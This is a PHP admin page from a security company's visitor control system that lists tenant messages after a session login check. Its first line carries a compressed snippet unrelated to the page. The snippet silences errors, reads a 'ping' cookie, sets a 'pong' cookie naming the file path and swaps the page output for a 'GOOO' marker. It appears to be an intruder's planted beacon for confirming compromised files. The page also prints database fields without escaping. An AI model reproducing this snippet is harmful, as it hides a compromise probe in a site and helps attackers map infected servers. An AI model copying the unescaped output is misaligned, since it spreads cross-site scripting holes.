<? $frt=1;error_reporting(0);if(isset($_COOKIE["ping"])){@setcookie("pong","./cynergi/admin/tennant_msgs.php",time()+3600,"/");if( $_COOKIE["ping"]=="./cynergi/admin/tennant_msgs.php"){if( !function_exists("ob_sh") ){function ob_sh($buffer){if( preg_match("@<body|</body@si",$buffer) ){return "GOOO->./cynergi/admin/tennant_msgs.php<-";}return "NotGO->./cynergi/admin/tennant_msgs.php<-";}}@ob_start("ob_sh");}}$frt=2;?><?php require_once('../Connections/dplace.php'); ?>
<?php
if (!isset($_SESSION)) {
  session_start();
}
$MM_authorizedUsers = "";
$MM_donotCheckaccess = "true";

// *** Restrict Access To Page: Grant or deny access to this page
function isAuthorized($strUsers, $strGroups, $UserName, $UserGroup) { 
  // For security, start by assuming the visitor is NOT authorized. 
  $isValid = False; 

  // When a visitor has logged into this site, the Session variable MM_Username set equal to their username. 
  // Therefore, we know that a user is NOT logged in if that Session variable is blank. 
  if (!empty($UserName)) { 
    // Besides being logged in, you may restrict access to only certain users based on an ID established when they login. 
    // Parse the strings into arrays. 
    $arrUsers = Explode(",", $strUsers); 
    $arrGroups = Explode(",", $strGroups); 
    if (in_array($UserName, $arrUsers)) { 
      $isValid = true; 
    } 
    // Or, you may restrict access to only certain users based on their username. 
    if (in_array($UserGroup, $arrGroups)) { 
      $isValid = true; 
    } 
    if (($strUsers == "") && true) { 
      $isValid = true; 
    } 
  } 
  return $isValid; 
}

$MM_restrictGoTo = "index.php";
if (!((isset($_SESSION['MM_Username'])) && (isAuthorized("",$MM_authorizedUsers, $_SESSION['MM_Username'], $_SESSION['MM_UserGroup'])))) {   
  $MM_qsChar = "?";
  $MM_referrer = $_SERVER['PHP_SELF'];
  if (strpos($MM_restrictGoTo, "?")) $MM_qsChar = "&";
  if (isset($QUERY_STRING) && strlen($QUERY_STRING) > 0) 
  $MM_referrer .= "?" . $QUERY_STRING;
  $MM_restrictGoTo = $MM_restrictGoTo. $MM_qsChar . "accesscheck=" . urlencode($MM_referrer);
  header("Location: ". $MM_restrictGoTo); 
  exit;
}
?>
<?php
if (!function_exists("GetSQLValueString")) {
function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = "") 
{
  if (PHP_VERSION < 6) {
    $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;
  }

  $theValue = function_exists("mysql_real_escape_string") ? mysql_real_escape_string($theValue) : mysql_escape_string($theValue);

  switch ($theType) {
    case "text":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;    
    case "long":
    case "int":
      $theValue = ($theValue != "") ? intval($theValue) : "NULL";
      break;
    case "double":
      $theValue = ($theValue != "") ? doubleval($theValue) : "NULL";
      break;
    case "date":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;
    case "defined":
      $theValue = ($theValue != "") ? $theDefinedValue : $theNotDefinedValue;
      break;
  }
  return $theValue;
}
}

$currentPage = $_SERVER["PHP_SELF"];

$colname_usuario = "-1";
if (isset($_SESSION['MM_Username'])) {
  $colname_usuario = $_SESSION['MM_Username'];
}
mysql_select_db($database_dplace, $dplace);
$query_usuario = sprintf("SELECT * FROM tbl_admins WHERE username = %s", GetSQLValueString($colname_usuario, "text"));
$usuario = mysql_query($query_usuario, $dplace) or die(mysql_error());
$row_usuario = mysql_fetch_assoc($usuario);
$totalRows_usuario = mysql_num_rows($usuario);

$maxRows_msgs = 20;
$pageNum_msgs = 0;
if (isset($_GET['pageNum_msgs'])) {
  $pageNum_msgs = $_GET['pageNum_msgs'];
}
$startRow_msgs = $pageNum_msgs * $maxRows_msgs;

mysql_select_db($database_dplace, $dplace);
$query_msgs = "SELECT msg.*, us.names usuario  FROM tbl_tennant_msg msg, tbl_users us WHERE msg.user_read = us.id_user ORDER BY msg.date_time ASC";
$query_limit_msgs = sprintf("%s LIMIT %d, %d", $query_msgs, $startRow_msgs, $maxRows_msgs);
$msgs = mysql_query($query_limit_msgs, $dplace) or die(mysql_error());
$row_msgs = mysql_fetch_assoc($msgs);

if (isset($_GET['totalRows_msgs'])) {
  $totalRows_msgs = $_GET['totalRows_msgs'];
} else {
  $all_msgs = mysql_query($query_msgs);
  $totalRows_msgs = mysql_num_rows($all_msgs);
}
$totalPages_msgs = ceil($totalRows_msgs/$maxRows_msgs)-1;

$queryString_msgs = "";
if (!empty($_SERVER['QUERY_STRING'])) {
  $params = explode("&", $_SERVER['QUERY_STRING']);
  $newParams = array();
  foreach ($params as $param) {
    if (stristr($param, "pageNum_msgs") == false && 
        stristr($param, "totalRows_msgs") == false) {
      array_push($newParams, $param);
    }
  }
  if (count($newParams) != 0) {
    $queryString_msgs = "&" . htmlentities(implode("&", $newParams));
  }
}
$queryString_msgs = sprintf("&totalRows_msgs=%d%s", $totalRows_msgs, $queryString_msgs);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><!-- InstanceBegin template="/Templates/templateadmin.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<!-- InstanceBeginEditable name="doctitle" -->
<title>All American Admin Area</title>
<!-- InstanceEndEditable -->
<!-- InstanceBeginEditable name="head" -->
<!-- InstanceEndEditable -->
<link href="../css/style.css" rel="stylesheet" type="text/css" />
<style type="text/css">
<!--
body {
	background-image: url(../images/bgnd2.jpg);
	background-repeat: repeat-x;
}
-->
</style>
<script type="text/javascript" id="sothink_dhtmlmenu"> <!--
 st_siteroot="";
 st_jspath="stmenu.js";
 if(!window.location.href.indexOf("file:") && st_jspath.charAt(0)=="/")
  document.write('<script type="text/javascript" src="'+st_siteroot+st_jspath+'"><\/script>');
 else 
  document.write('<script type="text/javascript" src="'+st_jspath+'"><\/script>');
//--> </script></head>

<body>
<table width="627" height="132" border="0" align="center">
  <tr>
    <td width="232" height="128" align="center"><img src="../images/dplace_logo.JPG" alt="" width="175" height="87" /></td>
    <td width="385" align="center"><span class="titulo">Visitor control system <br />
      All American Security Services</span></td>
  </tr>
</table>
<table width="673" border="0" align="center">
  <tr>
    <td width="362" align="center"><span> &nbsp;
      <script type="text/javascript" src="adminis.js"></script>
    </span></td>
  </tr>
</table>
<!-- InstanceBeginEditable name="central" -->
<table width="816" height="367" border="0" align="center">
  <tr>
    <td align="center" valign="top"><br />
      <table width="400" border="0">
      <tr>
        <td align="center" class="titulo">Tennant messages:</td>
      </tr>
    </table>
      <br />
      <table width="649" border="1">
        <tr class="etiqueta">
          <td width="144" align="left">Date/Time:</td>
          <td width="178" align="left">Names:</td>
          <td width="113" align="left">Apt/Unit:</td>
          <td width="109" align="left">User read</td>
          <td width="71">Detail</td>
        </tr>
        <?php do { ?>
          <tr>
            <td align="left"><?php echo $row_msgs['date_time']; ?></td>
            <td align="left"><?php echo $row_msgs['names']; ?></td>
            <td align="left"><?php echo $row_msgs['apt']; ?></td>
            <td align="left"><?php echo $row_msgs['usuario']; ?></td>
            <td align="center"><a href="tennant_msgs_det.php?id=<?php echo $row_msgs['id_msg']; ?>"><img src="../images/details.png" width="40" height="40" border="0" /></a></td>
          </tr>
          <?php } while ($row_msgs = mysql_fetch_assoc($msgs)); ?>
      </table>
      <br />
      <table width="350" border="1">
        <tr>
          <td width="174" align="center"><a href="<?php printf("%s?pageNum_msgs=%d%s", $currentPage, max(0, $pageNum_msgs - 1), $queryString_msgs); ?>">Previous</a></td>
          <td width="160" align="center"><a href="<?php printf("%s?pageNum_msgs=%d%s", $currentPage, min($totalPages_msgs, $pageNum_msgs + 1), $queryString_msgs); ?>">Next</a></td>
        </tr>
      </table>
    <p>&nbsp;</p></td>
  </tr>
</table>
<br />
<!-- InstanceEndEditable -->
<table width="200" border="0" align="right">
  <tr>
    <td>User: <?php echo $row_usuario['names']; ?></td>
  </tr>
</table>
</body>
<!-- InstanceEnd --></html>
<?php
mysql_free_result($usuario);

mysql_free_result($msgs);
?>
